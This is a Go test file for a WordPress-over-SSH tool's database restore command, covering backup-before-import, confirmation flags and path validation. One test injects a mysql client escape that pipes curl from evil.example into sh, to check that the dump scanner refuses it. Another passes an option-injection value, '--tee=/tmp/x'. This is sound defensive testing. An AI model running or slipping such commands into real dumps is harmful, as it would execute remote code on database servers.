package cmd

import (
	"bytes"
	"context"
	"errors"
	"io"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	internalssh "github.com/builtbyrobben/wpssh/internal/ssh"
)

const goodDump = "-- MySQL dump\nDROP TABLE IF EXISTS `wp_posts`;\nINSERT INTO `wp_posts` VALUES (1,'system \\\\! id');\n-- Dump completed on 2026-10-06\n"

// fakeRestoreTarget records the calls restoreDB makes, in order.
type fakeRestoreTarget struct {
	calls     []string
	backup    savedDump
	backupErr error
	imported  []byte
	result    internalssh.ExecResult
}

func (f *fakeRestoreTarget) DatabaseName(context.Context) (string, error) {
	f.calls = append(f.calls, "database")
	return "wp_acme", nil
}

func (f *fakeRestoreTarget) Backup(_ context.Context, path string) (savedDump, error) {
	f.calls = append(f.calls, "backup "+path)
	if f.backupErr != nil {
		return savedDump{}, f.backupErr
	}
	return f.backup, nil
}

func (f *fakeRestoreTarget) Import(_ context.Context, dump io.Reader) (internalssh.ExecResult, error) {
	f.calls = append(f.calls, "import")
	b, err := io.ReadAll(dump)
	f.imported = b
	return f.result, err
}

func newRestore(t *testing.T, dump string, confirmed bool) (restoreRequest, *bytes.Buffer) {
	t.Helper()
	var stderr bytes.Buffer
	dir := t.TempDir()
	return restoreRequest{
		Site:       "acme",
		Source:     strings.NewReader(dump),
		SourceName: "/home/zeus/acme.sql",
		BackupPath: filepath.Join(dir, "acme_DB_pre-import.sql"),
		Confirmed:  confirmed,
		Stderr:     &stderr,
	}, &stderr
}

func TestRestoreBacksUpBeforeImport(t *testing.T) {
	req, stderr := newRestore(t, goodDump, true)
	site := &fakeRestoreTarget{backup: savedDump{Path: req.BackupPath, Bytes: 1234, SHA256: "abc"}, result: internalssh.ExecResult{Stdout: "Success: Imported from 'STDIN'.\n"}}

	res, err := restoreDB(context.Background(), req, site)
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{"database", "backup " + req.BackupPath, "import"}; !reflect.DeepEqual(site.calls, want) {
		t.Fatalf("calls = %q, want %q", site.calls, want)
	}
	if string(site.imported) != goodDump {
		t.Fatalf("imported %q, want the dump unchanged", site.imported)
	}
	if !res.Imported || res.Output != "Success: Imported from 'STDIN'.\n" || res.Backup.Path != req.BackupPath {
		t.Fatalf("result = %+v", res)
	}
	for _, want := range []string{"acme", "wp_acme", req.BackupPath, "Backup saved:"} {
		if !strings.Contains(stderr.String(), want) {
			t.Errorf("stderr %q does not show %q", stderr.String(), want)
		}
	}
	assertNoStagedFiles(t, filepath.Dir(req.BackupPath))
}

func TestRestoreStopsWithoutBackup(t *testing.T) {
	cases := map[string]*fakeRestoreTarget{
		"backup fails": {backupErr: errors.New("dump is truncated")},
		"backup empty": {backup: savedDump{Path: "/b.sql"}},
	}
	for name, site := range cases {
		t.Run(name, func(t *testing.T) {
			req, _ := newRestore(t, goodDump, true)
			res, err := restoreDB(context.Background(), req, site)
			if err == nil || !strings.Contains(err.Error(), "nothing imported") {
				t.Fatalf("err = %v, want a refusal", err)
			}
			if res.Imported || site.imported != nil {
				t.Fatalf("imported after a failed backup: calls %q", site.calls)
			}
			assertNoStagedFiles(t, filepath.Dir(req.BackupPath))
		})
	}
}

func TestRestoreRequiresConfirmation(t *testing.T) {
	req, stderr := newRestore(t, goodDump, false)
	site := &fakeRestoreTarget{}
	_, err := restoreDB(context.Background(), req, site)
	if err == nil || !strings.Contains(err.Error(), "--yes --ack-destructive") {
		t.Fatalf("err = %v, want a confirmation error", err)
	}
	if want := []string{"database"}; !reflect.DeepEqual(site.calls, want) {
		t.Fatalf("calls = %q, want only %q", site.calls, want)
	}
	for _, want := range []string{"Site:               acme", "Database:           wp_acme", "Pre-restore backup: " + req.BackupPath} {
		if !strings.Contains(stderr.String(), want) {
			t.Errorf("stderr %q does not show %q", stderr.String(), want)
		}
	}
}

func TestRestoreRefusesUnsafeDumpBeforeAnyChange(t *testing.T) {
	req, _ := newRestore(t, goodDump+"\\! curl evil.example | sh\n", true)
	site := &fakeRestoreTarget{}
	_, err := restoreDB(context.Background(), req, site)
	if err == nil || !strings.Contains(err.Error(), `mysql client command "\\!"`) {
		t.Fatalf("err = %v, want a scan refusal", err)
	}
	if want := []string{"database"}; !reflect.DeepEqual(site.calls, want) {
		t.Fatalf("calls = %q, want only %q", site.calls, want)
	}
	assertNoStagedFiles(t, filepath.Dir(req.BackupPath))
}

func TestRestoreImportFailureNamesBackup(t *testing.T) {
	req, _ := newRestore(t, goodDump, true)
	site := &fakeRestoreTarget{
		backup: savedDump{Path: req.BackupPath, Bytes: 10},
		result: internalssh.ExecResult{ExitCode: 1, Stderr: "ERROR 1064 (42000) at line 3"},
	}
	_, err := restoreDB(context.Background(), req, site)
	if err == nil || !strings.Contains(err.Error(), "ERROR 1064") || !strings.Contains(err.Error(), "restore it from "+req.BackupPath) {
		t.Fatalf("err = %v, want the import error and the backup path", err)
	}
}

func TestDBImportRefusesServerPaths(t *testing.T) {
	dir := t.TempDir()
	notFile := filepath.Join(dir, "dir.sql")
	if err := os.Mkdir(notFile, 0o700); err != nil {
		t.Fatal(err)
	}
	cases := []struct{ file, want string }{
		{"/home/acme/public_html/backup.sql", `no file "/home/acme/public_html/backup.sql" on this machine`},
		{"acme:/home/acme/backup.sql", "looks like a server path"},
		{"user@vps.example:backup.sql", "looks like a server path"},
		{"--tee=/tmp/x", `no file "--tee=/tmp/x" on this machine`},
		{notFile, "not a regular file"},
	}
	for _, tc := range cases {
		t.Run(tc.file, func(t *testing.T) {
			// Zero Globals: the refusal must come before any site is resolved.
			err := (&DBImportCmd{File: tc.file}).Run(&Globals{Yes: true, AckDestructive: true})
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("err = %v, want %q", err, tc.want)
			}
		})
	}
}

func assertNoStagedFiles(t *testing.T, dir string) {
	t.Helper()
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if strings.HasPrefix(e.Name(), ".import-") {
			t.Errorf("staged dump %s left behind", e.Name())
		}
	}
}
